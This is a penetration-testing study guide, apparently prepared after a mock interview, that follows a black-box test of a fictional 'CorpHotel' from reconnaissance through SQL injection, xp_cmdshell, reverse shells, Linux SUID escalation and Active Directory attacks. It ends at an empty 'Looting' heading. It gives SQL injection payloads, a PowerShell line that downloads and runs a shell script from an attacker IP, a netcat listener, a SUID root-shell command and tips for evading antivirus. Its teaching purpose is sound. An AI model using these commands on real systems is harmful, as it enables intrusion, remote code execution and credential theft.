# 📚 Part 1: The Mindset & Methodology
> "The Battle is Won Before It Begins"

## 1. The Core Philosophy: Black Box Testing
In our scenario, you were hired for a **Black Box** test.
*   **Definition:** You have zero prior knowledge of the internal network. You only have the company name ("CorpHotel").
*   **The Goal:** Simulate a real-world attacker who starts from the outside and fights their way in.

---

## 2. The Standard Workflow (The Map)
In the interview, you initially jumped straight to step 2 (Scanning). This is a red flag. Always strictly follow the **Cyber Kill Chain** or **PTES** (Penetration Testing Execution Standard) order:

1.  **Intelligence Gathering (OSINT):** Finding targets without touching them.
2.  **Scanning & Enumeration:** Touching the targets to find open doors (Ports).
3.  **Vulnerability Analysis:** Checking if the doors are locked.
4.  **Exploitation:** Breaking in.
5.  **Post-Exploitation:** Looting and pivoting.

---

## 3. The "Rookie Mistake": Premature Scanning ⚠️
**Your Scenario Action:**
> *"First scan the network using nmap to see if there's any open port..."*

**The Problem:**
You didn't know the IP yet! If you Google "CorpHotel" and scan the first IP you see, you might be attacking:
*   A hosting provider (GoDaddy, AWS).
*   A different company with a similar name.
*   A "Honeypot" set up to catch hackers.

**The Fix:**
Never touch `nmap` until you have confirmed the **Scope**. In a Black Box test, this means using OSINT to verify ownership of the IP addresses.

---

## 4. Deep Dive: The "Cloudflare Wall" 🛡️
This was the critical technical hurdle in our mock interview.

**The Scenario:**
You pinged `www.corphotel.com` and got IP `104.21.75.2`. You decided to attack it.
**The Reality:** That IP belonged to **Cloudflare**, not the client.

### A. What is a Reverse Proxy?
Cloudflare sits in front of the real server like a bodyguard.
`User/Hacker` → `Cloudflare` → `Real Server (Origin)`
*   When you ping, you are pinging the bodyguard.
*   When you scan, you are scanning the bodyguard's armor (which is impenetrable).

### B. Why `tracert` Failed
You suggested using `tracert` (Traceroute) to find the real IP.
*   **Why it fails:** Traceroute maps the path your packet takes. Since your packet is addressed to Cloudflare, the map stops at Cloudflare. It cannot see "behind" the proxy because that traffic happens on a separate connection that you aren't part of.

### C. The Solution: How to Find the "Origin IP"
If you can't attack the front door, you have to find the back door.

#### Technique 1: Historical DNS (The Time Machine)
*   **Logic:** Before a company buys Cloudflare, their domain pointed directly to their real IP. They often forget to delete this old record history.
*   **Tools:** ViewDNS.info, SecurityTrails, Whoxy.
*   **Action:** Look at the "A Record" history. If you see the IP changed from `192.168.10.55` to `104.21.75.2` last month, the old IP is likely still active!

#### Technique 2: Subdomain Leakage
*   **Logic:** Admins protect the main site (www), but forget the dev sites.
*   **Tools:** Gobuster (DNS mode), Sublist3r.
*   **Action:** Find `ftp.corphotel.com` or `dev.corphotel.com`. If these resolve to a non-Cloudflare IP, that's likely the same server as the main website.

---

## ✅ Part 1 Checklist (Memorize This)
- [ ] **Verify Ownership:** Never scan without verifying the IP owner (use `whois`).
- [ ] **OSINT First:** Use Google Dorks, LinkedIn (for usernames), and DNS dumpster.
- [ ] **Identify CDNs:** If the IP belongs to a CDN (Cloudflare/Akamai), do not scan it directly.
- [ ] **Find the Origin:** Use Historical DNS or Subdomains to bypass the WAF/Proxy.


---
# ---
---

# 📚 Part 2: Network Scanning & Nmap Deep Dive
> "Knocking on the Doors"

## 1. The Context
Having successfully bypassed Cloudflare in Part 1, you have identified the Origin IP: `192.168.10.55`. The next phase is identifying open **Ports** (doors) to find an entry point.

---

## 2. The Golden Command 🛠️
The following command is a standard "Aggressive" scan used to gather detailed information quickly:

`nmap -sS -sC -sV -O -T4 -p- 192.168.10.55`

### Flag Breakdown
| Flag | Name | Purpose |
| :--- | :--- | :--- |
| **-sS** | SYN Scan | The default "stealth" scan; fast and doesn't complete the full connection. |
| **-sC** | Script Scan | Executes default Nmap scripts (NSE) to detect common vulnerabilities. |
| **-sV** | Version Scan | Probes open ports to determine service versions (e.g., Apache 2.4). |
| **-O** | OS Detection | Attempts to identify the Operating System (Linux vs. Windows). |
| **-T4** | Timing | Increases speed (T1 is slowest/stealthiest; T5 is fastest/unstable). |
| **-p-** | All Ports | Scans the full range (1–65,535) instead of just the top 1,000. |

---

## 3. Deep Dive: The SYN Scan (-sS) 🕵️‍♂️
Understanding how Nmap interacts with the TCP handshake is vital for stealth and efficiency.

*   **Standard TCP Handshake:** `SYN` → `SYN/ACK` → `ACK`. The connection is fully established and logged by the application.
*   **SYN Scan (Half-Open):** `SYN` → `SYN/ACK` → `RST` (Reset). 
*   **The Logic:** You initiate the connection to see if the port responds, but you "run away" (send a Reset packet) before the connection is finished. This is faster and may bypass basic application logging.

---

## 4. The "All Ports" Strategy (-p-) 🔢
*   **Default Behavior:** Without `-p-`, Nmap only scans the **Top 1,000** most common ports.
*   **The Risk:** Attackers and administrators often hide services on non-standard ports (e.g., SSH on `2222` or a database on `54321`) to avoid detection.
*   **The Solution:** Using `-p-` ensures you don't miss these hidden services.
*   **Strategy:** Run a quick scan of common ports first for immediate targets, while running the full `-p-` scan in the background.

---

## 5. UDP vs. TCP (The Missing Piece)
Nmap targets TCP by default, but many critical services use UDP.

*   **TCP:** Connection-oriented and reliable (Web, SSH, SMB).
*   **UDP:** "Fire and forget" (DNS, SNMP, TFTP). 
*   **The Trap:** A standard scan might show Port 53 (DNS) as closed because it's only checking TCP.
*   **The Flag:** Use `-sU` to scan UDP ports. Note that this is significantly slower than TCP scanning.

---

## ✅ Part 2 Checklist (Memorize This)
- [ ] **Prioritize:** Start with a default port scan, then follow up with a full `-p-` scan.
- [ ] **Log Everything:** Use `-oA <filename>` to save results in all three major Nmap formats.
- [ ] **Permissions:** Remember that `sudo` is required for raw packet crafts like `-sS` and `-O`.
- [ ] **Efficiency:** Use the `-A` (Aggressive) flag as a shortcut for `-sC`, `-sV`, `-O`, and traceroute.


---
# ---
---

# 📚 Part 3: Service Enumeration (Windows Focus)
"Reading the Signs & Choosing the Right Key"

## 1. The Context
Your Nmap scan returned this output:

```plaintext
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
445/tcp open  microsoft-ds Windows Server 2019 Standard
```

## 2. Identifying the Operating System 🕵️‍♂️
Before you run any exploits, you must know what you are attacking.

**The Clue:** Port 80 says Microsoft IIS. Port 445 says Windows Server 2019.

**The Verdict:** This is a Windows machine.

**Why it matters:** Linux tools (like specific reverse shells or file paths like /etc/passwd) will not work. You must switch your brain to "Windows Mode."

## 3. The "Mystery" of Port 445 📂
**Your Confusion:**

"It says microsoft-ds, so I think it means Directory Services."

**The Reality:**

Port 445 is SMB (Server Message Block).

**What is it?** It is the protocol for Network File Sharing. It’s how computers in an office share printers and folders.

**Why Nmap calls it microsoft-ds:** Technically, Active Directory can talk over this port, but for a pentester, 445 = File Shares.

(Note: Actual "Directory Services" / LDAP lives on Port 389).

## 4. The Tool Trap: dir vs. smbclient 🛠️
**Your Confusion:**

"I would use command dir, since its a windows."

This is the most common mistake beginners make. You must distinguish between **Local** and **Remote**.

**dir (Local Command):**

This is a command you type into a Windows Command Prompt when you are already logged in to that computer.

**Scenario:** You don't have a login yet! You are sitting on your Kali Linux laptop outside the castle. Typing dir just lists the files on your laptop.

**smbclient (Remote Tool):**

This is a specialized Linux tool that "speaks" the SMB language. It sends packets across the network to ask the Windows server, "What folders do you have?"

**The Analogy:**

**dir** = Opening your own backpack to see what's inside.

**smbclient** = Using a telescope to look through your neighbor's window.

## 5. The Attack: Null Sessions (The "Open Window") 🔓
The first thing we check on Port 445 is: "Did the admin forget to lock the door?" This is called a **Null Session** or **Anonymous Login**.

**The Command to Memorize:**

```bash
smbclient -L //192.168.10.55 -N
```

*   **-L:** List the shares (folders).
*   **//192.168.10.55:** The target (Windows uses backslashes \, but in Linux terminal we use forward slashes /).
*   **-N:** No password (try to login anonymously).

**The "Jackpot" Output:**

```plaintext
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default Share
Marketing       Disk      <-- LOOK HERE!
Backups         Disk      <-- LOOK HERE!
```

*   **$ signs (e.g., C$, ADMIN$):** These are hidden administrative shares. You usually can't access them without being an Admin.
*   **No $ (e.g., Backups):** These are custom shares. These are your target. Users often store sensitive files (passwords.txt, config files) here.

## ✅ Part 3 Checklist (Memorize This)
- [ ] Port 445 = SMB (File Sharing). It is rarely "Directory Services" in the context of initial access.
- [ ] Don't use dir until you have a shell. Use smbclient to talk to the server from outside.
- [ ] Always check for Null Sessions: It takes 5 seconds and leads to instant wins.
- [ ] Other Tools: If you hate the command line, enum4linux is a tool that runs smbclient automatically for you.

---
# ---
---

# 📚 Part 4: Web Enumeration (The Tech Stack)
> "Speak the Right Language"

## 1. The Context
Port 445 (SMB) was locked down. You pivot to Port 80 (HTTP).
Your Nmap scan identified the server as:
**Microsoft IIS httpd 10.0**

## 2. The Logic: OS Determines the Language 🧠
Web servers are not all the same. The underlying Operating System usually dictates the scripting language.

| Server Header | OS | Likely Language | Extensions to Hunt |
| :--- | :--- | :--- | :--- |
| Apache / Nginx | Linux | PHP, Python, Node | .php, .py, .js |
| Microsoft IIS | Windows | ASP.NET | .aspx, .ashx, .asp |
| Tomcat / Jetty | Any | Java | .jsp, .war |

## 3. The Mistake: Generic Scanning ⚠️
**Your Scenario Action:**
"I'll use gobuster... maybe python or dotnet? Since you mentioned PHP usually don't work."

**The Problem:**
If you run a default gobuster scan, it often looks for generic files or just directories. If you tell it to look for .php on a Windows IIS server, it is like looking for a "Start Menu" on a MacBook. You will find nothing, even if the server is vulnerable.

## 4. The Solution: Targeting ASP.NET
Since Nmap told us it is IIS, we must configure our directory buster to look for Microsoft-specific files.

**The Golden Extensions:**
*   **.aspx** (Active Server Pages Extended): This is the modern standard for dynamic Windows pages (like login.aspx).
*   **.asp** (Classic ASP): The old version. If you find these, it often means legacy code (which implies old vulnerabilities!).
*   **.config** (Configuration Files): **CRITICAL**.

## 5. The "Loot" File: web.config 💎
In the Linux/PHP world, configuration is often in `/var/www/html/config.php` or messy paths.
In the Windows/IIS world, almost every application has a **web.config** file in the root directory.

*   **What's inside?** Database connection strings.
*   **Why is it vulnerable?** Developers often hardcode the Database Username and Password in cleartext inside this file.
*   **The Attack:** If you can read `http://target.com/web.config` (due to a misconfiguration), you steal the database credentials instantly.

## 6. The Correct Command 🛠️
You mentioned gobuster. Here is the exact command you need for an IIS target:

```bash
gobuster dir -u http://192.168.10.55 -w /usr/share/wordlists/dirb/common.txt -x aspx,asp,config
```

*   **dir:** Directory brute-forcing mode.
*   **-u:** The URL.
*   **-w:** The wordlist (dictionary of names).
*   **-x:** Extensions to append. This tells the tool: "For every word in the list (e.g., 'admin'), also check 'admin.aspx', 'admin.asp', and 'admin.config'."

## ✅ Part 4 Checklist (Memorize This)
- [ ] **Check the Headers:** Does Nmap or Wappalyzer say "IIS"? If yes, think ASP.NET.
- [ ] **Don't hunt for .php on IIS:** It wastes time and creates noise.
- [ ] **Always hunt for .config:** Finding a web.config is often an instant "Game Over."
- [ ] **The -x flag is mandatory:** Never run Gobuster without specifying extensions relevant to the target.


---
# ---
---


# 📚 Part 5: Web Exploitation (SQL Injection)
> "Manipulating the Database"

## 1. The Context
You found the login page: `http://192.168.10.55/login.aspx`. You want to bypass the login without a password.

## 2. The "Litmus Test" 🧪
Before you try complex exploits, you simply check: "Is the database listening to me?"

**The Input:** A single quote `'`.

**The Logic:** SQL queries use quotes to define strings (e.g., `'admin'`). If you type one extra quote, you create an "unclosed string" error.

**The Result:** If the page crashes or shows a database error (e.g., `Unclosed quotation mark`), it is vulnerable.

## 3. Authentication Bypass (The Logic) 🔓
**Your Payload:** `admin' OR 1=1;--` Let's see exactly what happens inside the code.

**The Code's Original Query:**
```sql
SELECT * FROM users WHERE username = '$user' AND password = '$password';
```

**The Query with Your Payload:**
```sql
SELECT * FROM users WHERE username = 'admin' OR 1=1;--' AND password = '...';
```

**The Breakdown:**
*   **admin:** The user you want to be.
*   **':** Closes the developer's opening quote.
*   **OR 1=1:** The "Tautology." Since 1 always equals 1, the statement is TRUE.
*   **;:** (Optional) Ends the statement.
*   **--:** The Comment. This tells the database to ignore everything that comes after it (specifically, the password check).

## 4. The "Syntax Trap": Comments ⚠️
You must know which "Comment Character" to use based on the database.

*   **MSSQL (Windows/IIS):** `--` (Dash Dash)
*   **PostgreSQL:** `--` (Dash Dash)
*   **MySQL (Linux/PHP):** `#` (Hash) OR `-- ` (Dash Dash Space)

**Note:** In URLs, `#` must be encoded as `%23`.

## 5. Advanced SQL Injection Types (Per Your Request) 🚀
Bypassing login is just Level 1. Here are the other ways to attack:

### A. Union-Based SQLi (The Data Dump)
You use the `UNION` operator to combine the results of the original query with a new query that steals data.

**Goal:** "Show me the users list instead of the product list."

**Payload Example:**
```sql
' UNION SELECT username, password, credit_card FROM users--
```
**Requirement:** You must guess the correct number of columns first (e.g., `' ORDER BY 1--`, `' ORDER BY 2--`).

### B. Error-Based SQLi (The "Chatty" Error)
You intentionally ask the DB to do something impossible (like converting a word into a number) so that it "complains" and reveals secret info in the error message.

**Goal:** Read data when you can't see the page output.

**Payload Example (MSSQL):**
```sql
' AND 1=(SELECT TOP 1 password FROM users)--
```
**The Error Message:** "Conversion failed when converting the varchar value 'P@ssw0rd123' to data type int." (The DB just leaked the password in the error!).

### C. Blind SQLi (The "Twenty Questions")
The page shows no errors and no data. It just says "Login Failed" or "Welcome."

*   **Boolean-Based:** You ask True/False questions.
    *   **Input:** `' AND 1=1--` (Page loads normal = True).
    *   **Input:** `' AND 1=0--` (Page loads error = False).
*   **Time-Based:** You ask the DB to sleep if the answer is yes.
    *   **MSSQL:** `admin'; WAITFOR DELAY '0:0:10'--`
    *   **MySQL:** `admin' AND SLEEP(10)#`
    *   **Result:** If the page takes 10 seconds to load, you know the injection worked.

## ✅ Part 5 Checklist (Memorize This)
- [ ] **Test for Error:** Start with `'`.
- [ ] **Know the Comment:** Use `--` for Windows/MSSQL, `#` for Linux/MySQL.
- [ ] **Bypass Auth:** `admin' OR 1=1--`.
- [ ] **Time-Based Check:** If nothing works, try `WAITFOR DELAY` (Windows) or `SLEEP` (Linux) to confirm Blind SQLi.


---
# ---
---

# 📚 Part 6: From Web to Shell (RCE)
> "Escaping the Database Jail"

## 1. The Context
You have successfully performed SQL Injection (admin' OR 1=1;--). You are now logged in.
But you don't just want to see the admin panel; you want a command prompt on the underlying Windows Server.

## 2. The Confusion: ps_exec vs. xp_cmdshell ⚠️
**Your Scenario Answer:**
"ps_exec is for I guess php and os.system is for python... But for SQL I am unaware."

Let's clear this up once and for all. These are all ways to run commands, but they live in different worlds:

| Command/Tool | Context | When to use it |
| :--- | :--- | :--- |
| os.system() | Python Code | When you are writing a Python script. |
| PsExec | Windows Admin Tool | When you have a username/password and want to move laterally (machine to machine) via SMB. |
| xp_cmdshell | SQL Server | This is the answer. The specific command inside MSSQL that runs OS commands. |

## 3. The Golden Key: xp_cmdshell 🗝️
**What is it?**
It stands for Extended Procedure Command Shell. It is a feature built into Microsoft SQL Server that allows the database administrator to run Windows DOS commands (like dir, ping, whoami).

**The Problem:**
Microsoft knows this is dangerous, so they disable it by default on modern servers.

## 4. The Attack Chain (Memorize This) ⚔️
Since it is disabled, you (as the attacker with Admin SQL rights) must turn it back on.

**Step 1: Enable Advanced Options**
(You have to tell SQL Server, "Let me change the risky settings.")
```sql
SQLEXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
```

**Step 2: Enable xp_cmdshell**
(Now you flip the switch.)
```sql
SQLEXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

**Step 3: Execute the Command**
(Now you run a Windows command.)
```sql
SQLEXEC xp_cmdshell 'whoami';
```

**The Result:**
The database will return the output of the command (e.g., `nt authority\service`).

## 5. Weaponizing It (Getting the Reverse Shell) 🔫
Running whoami is fun, but we want a full connection. We use xp_cmdshell to download and run our malware.

**The Command:**
```sql
SQLEXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://10.10.10.10/shell.ps1'')"'
```

**What this does:** It tells the Windows server to use PowerShell to go to your Kali IP (10.10.10.10), download your script (shell.ps1), and execute it immediately in memory.

## ✅ Part 6 Checklist (Memorize This)
- [ ] **The Name:** It is xp_cmdshell.
- [ ] **The Status:** It is usually disabled by default.
- [ ] **The Fix:** You use sp_configure to enable it.
- [ ] **The Goal:** Use it to execute PowerShell or Certutil to download your reverse shell.

---
# ---
---

# 📚 Part 7: The Reverse Shell & Connectivity
> "Catching the Connection"

## 1. The Context
You used xp_cmdshell to tell the Windows server: "Connect back to me!" Now, you need to be ready to "catch" that connection on your Kali machine.

## 2. The Tool: Netcat (nc) 🐈
Netcat is the "Swiss Army Knife" of networking. You will use it in 99% of your CTFs and exams.

The "Muscle Memory" Command: You must be able to type this in your sleep:

```bash
nc -lvnp 4444
```

**The Flags Decoded:**
*   **-l (Listen):** Tells Netcat to enter "Server Mode" and wait for a connection.
*   **-v (Verbose):** "Talk to me." It tells you when someone connects (e.g., “Connection received from...”). Without this, the screen just sits there blank.
*   **-n (No DNS):** Do not try to look up the hostname of the IP connecting. It makes the connection much faster.
*   **-p (Port):** Specifies which port to listen on (e.g., 4444).

## 3. The Concept: Reverse Shell vs. Bind Shell 🔄
Your Confusion: In the interview, you understood "Ingress/Egress," but let's formalize why we almost always use Reverse Shells.

### A. Bind Shell (The "Front Door" Approach)
*   **How it works:** You tell the Victim server to open a port (e.g., 1234) and wait for you. You then connect to it.
*   **Why it fails:** Firewalls are designed to BLOCK incoming traffic (Ingress). If you try to connect to port 1234, the firewall says "Denied."

### B. Reverse Shell (The "Phone Home" Approach)
*   **How it works:** You tell the Victim server to connect back to YOU.
*   **Why it succeeds:** Firewalls are usually configured to ALLOW outgoing traffic (Egress) so employees can browse the web. The firewall sees the server trying to "talk to the internet" (you) and lets it through.

## 4. Troubleshooting: "Why didn't I get a shell?" 🛑
You ran the exploit, you set up the listener... and nothing happened. Silence. Here are the top 3 reasons why:

1.  **The Wrong Port:**
    *   You listened on Port 4444. The company firewall might block "weird" ports.
    *   **Fix:** Listen on Port 80, 443, or 53. These are "trusted" ports (Web/DNS) that are almost always allowed out.
2.  **Windows Defender (AV):**
    *   You tried to download a standard nc.exe or a common Meterpreter payload.
    *   **Result:** Defender deleted the file the millisecond it touched the disk.
    *   **Fix:** Use "Living off the Land" techniques (PowerShell one-liners) that run in memory, or obfuscate your payload.
3.  **NAT/IP Issues:**
    *   Did you tell the victim to connect to 127.0.0.1 (Localhost) or your VPN IP (10.10.x.x)?
    *   **Fix:** Always check `ifconfig` (or `ip a`) to get your `tun0` (VPN) IP address.

## ✅ Part 7 Checklist (Memorize This)
- [ ] **Always start the listener FIRST:** If the victim calls and you aren't listening, the call drops immediately.
- [ ] **Use -lvnp:** It is the standard.
- [ ] **Prefer Common Ports:** If 4444 fails, try 443 or 80.
- [ ] **Know your IP:** Ensure the payload points to your VPN IP, not your local Wi-Fi IP.

---
# ---
---

# 📚 Part 8: Linux Privilege Escalation (The Foundation)
> "The King's Sword"

## 1. The Context
You compromised the web server (via SQLi or File Upload) and caught a reverse shell.

**You are:** `www-data` (The web service account).

**Your Restrictions:** You cannot read `/etc/shadow` (passwords), you cannot look in `/root`, and you cannot install new software.

**Your Goal:** Become **root** (The Administrator).

## 2. The Concept: SUID (Set User ID) 👑
This is the #1 "low-hanging fruit" in Linux privilege escalation.

*   **Normal Behavior:** When you run a command (like `cat`), it runs with your permissions.
*   **SUID Behavior:** If a file has the SUID bit set, it runs with the permissions of the file owner (usually Root), no matter who runs it.

**Analogy:** Think of it like the King's Sword. Even if a peasant holds it, the sword still strikes with the King's authority. If you find a program owned by Root that has the SUID bit, and you can trick it into running a shell, you become Root.

**How to spot it:** Look for the `s` in the permissions list: `-rwsr-xr-x 1 root root`

## 3. The Hunt: Finding SUID Files 🕵️‍♂️
You need to search the entire hard drive for these special files. The Command to Memorize:

```bash
find / -perm -u=s -type f 2>/dev/null
```

**The Breakdown:**
*   **find /:** Search from the root directory down.
*   **-perm -u=s:** Look for files with the SUID bit set for the User.
*   **-type f:** Only look for files (not directories).
*   **2>/dev/null:** Critical. This takes all the "Permission Denied" errors (which will clutter your screen) and throws them into a black hole (null). You only see the clean results.

## 4. The Exploit: GTFOBins 📖
Once the find command finishes, you might see a list like:

```plaintext
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/python  <-- Suspicious!
/usr/bin/find    <-- Suspicious!
```

How do you know if one of these is exploitable? You use **GTFOBins** (GitHub). It is the "Encyclopedia" of Unix binary exploits.

**Example: Exploiting find** If the `find` command has SUID:
1.  Go to GTFOBins website.
2.  Search for `find`.
3.  Click "SUID".
4.  It gives you the command:

```bash
/usr/bin/find . -exec /bin/sh -p \; -quit
```

**Logic:** You tell the find utility (which is running as Root) to "execute" a shell (`/bin/sh`). Since find is Root, the shell it spawns is also Root.

## 5. Service Accounts (www-data) 🤖
Just a quick note on who you are starting as.

**www-data:** This is the default user for web servers (Apache/Nginx).

**Why it exists:** If a hacker hacks the website, they only get this weak user, not Root.

**Common Flaws:** Sometimes admins give `www-data` sudo rights to run specific scripts without a password. Always check `sudo -l` immediately after landing.

## ✅ Part 8 Checklist (Memorize This)
- [ ] **Check whoami:** Confirm you are `www-data`.
- [ ] **Check sudo -l:** Can you run anything as root without a password?
- [ ] **Run the SUID Hunt:** `find / -perm -u=s ...`
- [ ] **Consult the Bible:** Check every suspicious binary against GTFOBins.

---
# ---
---

# 📚 Part 9: Active Directory Structure (The Map)
"The Kingdom, The Castle, and The Rules"

## 1. The Context
You have a shell on a Windows machine. But a single machine is just a small house. You want to own the entire city. To do that, you must understand how the city is built.

## 2. The Hierarchy (Forests, Trees, Domains) 🗺️
Active Directory is organized like a medieval empire.

**The Domain (The Castle):**
This is the core building block. It is a Security Boundary.
It has its own users, its own computers, and its own Administrator.
Example: CorpHotel.local

**The Tree (The Region):**
A group of domains that share a continuous namespace (surname).
Example: If CorpHotel.local is the parent, then US.CorpHotel.local and UK.CorpHotel.local are children in the same Tree. They trust each other, but they are different castles.

**The Forest (The Empire):**
The collection of ALL Trees and Domains.
This is the ultimate boundary. If you control the Forest, you own every company inside it.
Example: CorpHotel.local + BoughtCompany.com (Different names, same Forest).

## 3. The Control: OUs vs. GPOs 📜
**Your Confusion:**
"OUs means specific rules... GPO means rules designed to specific group."

This was the key correction. You must separate the Container from the Rule.

**OU (Organizational Unit) = The Folder 📂**
*   What it is: A container to organize objects.
*   Purpose: To group things like "HR Computers" or "Intern Users."
*   Rule: An OU itself does nothing. It's just a bucket.

**GPO (Group Policy Object) = The Rule Book 📝**
*   What it is: A list of settings (e.g., "Disable USB," "Set Wallpaper," "Disable CMD").
*   How it works: You create a GPO and LINK it to an OU.
*   The Result: Everyone inside that OU effectively "reads the rule book" and obeys it.

**The Hacker's Goal:** If you can edit a GPO, you can push malware to every computer in that OU automatically.

## 4. The Targets: Groups 👥
Groups determine Access (Permissions), not Policy.

**Domain Users:**
The "Peasants." Every employee is here.
Power: Can read most of the directory (great for Recon).

**Domain Admins (DA):**
The "Kings."
Power: Full control over one domain. They can log into any PC in that domain.

**Enterprise Admins (EA):**
The "Emperors."
Power: Full control over the entire Forest.
Note: These accounts usually only exist in the "Root" (First) domain.

## ✅ Part 9 Checklist (Memorize This)
- [ ] Domain vs. Forest: A Domain is a castle; a Forest is the whole empire.
- [ ] OU vs. GPO: OU is the folder; GPO is the rule linked to it.
- [ ] The Holy Grail: Your goal is usually Domain Admin.
- [ ] Recon: Remember that even a basic "Domain User" can see the map of the network.


---
# ---
---

# 📚 Part 10: Authentication Protocols (The Theory)
> "The Secret Handshakes"

## 1. The Context
In a Windows domain, you don't send your password across the network (that would be crazy insecure). Instead, computers use cryptographic "puzzles" to prove who they are. There are two main protocols you must know.

## 2. NTLM (The Legacy Way) 👴
NTLM (New Technology LAN Manager) is the older protocol. It is still used when you talk to a machine by its IP address or if Kerberos fails.

**The Mechanism: "Challenge-Response"**
*   **Negotiation:** You say, "Hello, I am User: Alice."
*   **Challenge:** The Server sends a random string of numbers (a "Nonce") to you. "Okay Alice, encrypt this random number 12345 with your password hash."
*   **Response:** You do the math and send back the result.
*   **Verification:** The Server does the same math. If the results match, you are let in.

**The "Banana" Analogy:**
*   You claim to be the Monkey.
*   Server holds up a Banana (Challenge).
*   You peel it perfectly (Response) using your secret technique.
*   Server sees the peeled banana and trusts you, even though you never gave them your secret technique.

## 3. Kerberos (The Modern Way) 🐶
Kerberos is the default for Active Directory. It is much more secure and works on a "Ticket" system. It relies on a trusted Third Party called the KDC (Key Distribution Center).

**The Mechanism: "The Carnival"**
1.  **Authentication (AS-REQ):** You login with your password. The KDC gives you a TGT (Ticket Granting Ticket).
    *   **Analogy:** This is your "Wristband" for the Amusement Park. It proves you paid to get in.
2.  **Service Request (TGS-REQ):** You want to access the File Server. You show your TGT (Wristband) to the KDC and ask for a ticket for that specific server.
3.  **Service Ticket (TGS):** The KDC gives you a Service Ticket.
    *   **Analogy:** This is a "Ride Ticket" specifically for the Rollercoaster.
4.  **Access:** You hand the "Ride Ticket" to the File Server to get in.

**The Critical Detail:**
*   The TGT (Wristband) is encrypted with the KDC's special key (krbtgt). You cannot fake it.
*   The Service Ticket (Ride Ticket) is encrypted with the Target Server's password hash.

## 4. The Confusion: "Does the Server see my password?" 🙈
**Your Previous Question:**
"Does the server know my password?"

**The Answer: NO.**
*   **NTLM:** The server only sees the result of the math (The Hash).
*   **Kerberos:** The server only sees the Ticket.

This concept is called **Zero Knowledge Proof**. You prove you know the secret without ever revealing the secret itself.

**Why this matters for Hackers:** Since the system relies on Hashes and Tickets, if we can steal those hashes or tickets, we can impersonate users without ever knowing their actual password.

## ✅ Part 10 Checklist (Memorize This)
- [ ] **NTLM** = Challenge/Response. (Used for IP access).
- [ ] **Kerberos** = Tickets. (Used for Domain Name access).
- [ ] **TGT (Ticket Granting Ticket):** Your ID Badge / Wristband.
- [ ] **KDC (Key Distribution Center):** The Domain Controller acting as the ticket issuer.
- [ ] **Port 88:** Kerberos listens here.


---
# ---
---

# 📚 Part 11: Active Directory Attacks (The Practice)
> "Weaponizing the Protocols"

## 1. The Context
You have a foothold in the domain. Now you want to elevate your privileges or move to other machines. You abuse the protocols (NTLM and Kerberos) we just learned.

## 2. Pass-the-Hash (PtH) 🍛
**The Target:** NTLM Protocol.

**The Concept:**
Recall the NTLM "Banana" analogy. The server challenges you to perform math using your password hash.

**The Flaw:** If you steal the hash (from the `lsass.exe` memory of a machine you hacked), you do not need to crack it.

**The Attack:** You simply inject that stolen hash into your own memory and tell the server, "I am ready for the challenge." You perform the math using the stolen hash, and the server lets you in.

**The Key Characteristic:**
It is a **Replay Attack**. You use the hash as if it were the password.
**Status:** You are already authenticated. You don't know the password, and you don't care.
**Tools:** Evil-WinRM, CrackMapExec, Mimikatz (sekurlsa::pth).

## 3. Kerberoasting 🍖
**The Target:** Kerberos Protocol.

**The Concept:**
Recall the Kerberos "Ride Ticket" (Service Ticket).

**The Flaw:** Any valid user (even an intern) can request a Service Ticket for any service (like SQL Server).

**The Vulnerability:** The KDC gives you that ticket encrypted with the Service Account's NTLM hash.

**The Attack:** You ask for the ticket. You take it offline (save it to your laptop). You use a tool like Hashcat to try millions of passwords until one "unlocks" the ticket.

**The Key Characteristic:**
It is an **Offline Cracking Attack**.
**Status:** You are trying to discover the plaintext password of a Service Account so you can log in as them later.
**Tools:** Rubeus (Windows), GetUserSPNs.py (Linux/Impacket), Hashcat.

## 4. The Interview Cheat Sheet: PtH vs. Kerberoasting ⚔️
This is a guaranteed interview question. Memorize this table.

| Feature | Pass-the-Hash (PtH) | Kerberoasting |
| :--- | :--- | :--- |
| **Protocol Abused** | NTLM | Kerberos |
| **What you steal** | An NTLM Hash from memory. | An encrypted Service Ticket (TGS). |
| **Goal** | Log in immediately (Lateral Movement). | Crack the password (Privilege Escalation). |
| **Do you crack it?** | **NO.** You use the hash directly. | **YES.** You must crack it offline. |
| **Attack Location** | Online (Network connection required). | Offline (Can be done on your home rig). |

## ✅ Part 11 Checklist (Memorize This)
- [ ] **PtH = Reuse.** You steal a hash to move to another machine.
- [ ] **Kerberoasting = Crack.** You steal a ticket to guess a password.
- [ ] **SPN (Service Principal Name):** This is the identifier for a service account. You need to find users with SPNs to perform Kerberoasting.
- [ ] **Impacket:** The Python toolset (specifically `secretsdump.py` and `GetUserSPNs.py`) is the gold standard for these attacks on Linux.


---
# ---
---

# 📚 Part 12: Windows Post-Exploitation (The Crown Jewels)
> "looting the Memory"

## 1. The Context
You are now **nt authority\system** on the compromised Windows Server.
*   **The Reality:** You are "God" on this one specific machine.
*   **The Problem:** You are not God on the network yet. You need the credentials of a Domain Admin who might have logged into this machine previously.
*   **The Target:** You need to look inside the computer's RAM (Random Access Memory) to find leftover passwords.

## 2. The Process: LSASS.exe 🧠
**Your Confusion:** "No answers to both 1 and 2." (You didn't know the process name).

*   **The Concept:** LSASS stands for **Local Security Authority Subsystem Service**.
*   **What it does:** It is the "Bouncer" or "Security Guard" of Windows. Whenever a user logs in (even just to check email or open a file share), LSASS verifies their password.
*   **The Flaw:** To make Windows fast and user-friendly (so you don't have to type your password every 5 minutes), LSASS keeps a copy of your Credentials (Hashes, Kerberos Tickets, and sometimes Plaintext Passwords) active in memory.
*   **The Attack:** Since you are SYSTEM, you have permission to read the memory of any process—including LSASS.

## 3. The Tool: Mimikatz 🥝
**Your Confusion:** "No answers..." (You didn't know the tool name).

*   **The Concept:** Mimikatz is the most famous Windows post-exploitation tool in history.
*   **Creator:** Benjamin Delpy.
*   **The Logo:** A Kiwi fruit (or a Kiwi bird).
*   **What it does:** It interacts with LSASS to extract the secrets stored in memory.
*   **The "Kiwi" Connection:** If you are using Metasploit (the framework you likely used in TryHackMe), you don't always type `mimikatz`. Instead, you type:

```bash
load kiwi
```
This loads the Mimikatz module directly into your Meterpreter session.

## 4. The Commands (The "Looting") 💰
